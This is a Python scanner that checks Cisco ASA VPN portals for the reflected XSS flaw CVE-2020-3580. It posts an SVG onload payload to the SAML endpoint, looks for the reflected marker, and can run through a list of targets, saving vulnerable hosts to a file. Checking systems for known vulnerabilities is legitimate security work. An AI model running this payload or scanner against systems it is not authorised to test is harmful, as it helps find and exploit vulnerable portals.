#!/usr/bin/env python3
"""
Cisco ASA XSS Vulnerability Checker (CVE-2020-3580)

This script checks whether a Cisco Adaptive Security Appliance (ASA) VPN portal is vulnerable to a reflected Cross-Site Scripting (XSS) vulnerability (CVE-2020-3580). The vulnerability allows an
attacker to execute arbitrary JavaScript in the context of the victim's browser, potentially leading to unauthorized actions, session hijacking, or sensitive information disclosure.

The script can test a single URL or multiple URLs provided in a file and categorizes the results into 'vulnerable' or 'ignored' (not accessible) URLs, saving the results in an output directory.

Usage:
    python3 script.py -u example.com
    python3 script.py -f targets.txt

Requirements:
    - Python 3.x
    - requests, urllib3, colorama

Author:
    Vahe Demirkhanyan
"""
import os
import requests
import urllib3
import argparse
from colorama import init, Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class Cisco:
    def __init__(self, url):
        self.url = url.strip()

    def asa_xss(self):
        # build the target URL for the XSS test
        target_url = f"https://{self.url}/+CSCOE+/saml/sp/acs?tgname=a"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '44'
        }
        data = 'SAMLResponse=\\"><svg/onload=alert(\'PTSwarm\')>'
        response = requests.post(target_url, headers=headers, data=data, verify=False, timeout=10)
        return response

def process_url(url, output_dir):
    """Process a single URL and check for vulnerability."""
    try:
        cisco = Cisco(url)
        response = cisco.asa_xss()
        if "PTSwarm" in response.text:
            print(f"{url} --> {Fore.RED}is vulnerable{Style.RESET_ALL}")
            save_output(url, output_dir, vulnerable=True)
        else:
            print(f"{url} --> {Fore.GREEN}Not vulnerable{Style.RESET_ALL}")
    except Exception as e:
        print(f"{url} --> {Fore.MAGENTA}not accessible{Style.RESET_ALL}")
        save_output(url, output_dir, ignored=True)

def save_output(url, output_dir, vulnerable=False, ignored=False):
    """Save the URL to an output file based on its result."""
    if ignored:
        filename = "ignored.txt"
    elif vulnerable:
        filename = "vulnerable.txt"
    else:
        return  

    filepath = os.path.join(output_dir, filename)
    with open(filepath, "a") as f:
        f.write(url + "\n")

def main():
    parser = argparse.ArgumentParser(
        description="Cisco ASA XSS Vulnerability Checker"
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "-u", "--url", help="Target URL to test (e.g. example.com)"
    )
    group.add_argument(
        "-f", "--file", help="File containing list of target URLs (one per line)"
    )
    args = parser.parse_args()

    output_dir = "output"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    if args.url:
        process_url(args.url, output_dir)
    elif args.file:
        if not os.path.exists(args.file):
            print(f"[-] File '{args.file}' does not exist.")
            return
        with open(args.file, "r") as infile:
            for line in infile:
                url = line.strip()
                if url:
                    process_url(url, output_dir)

if __name__ == "__main__":
    main()
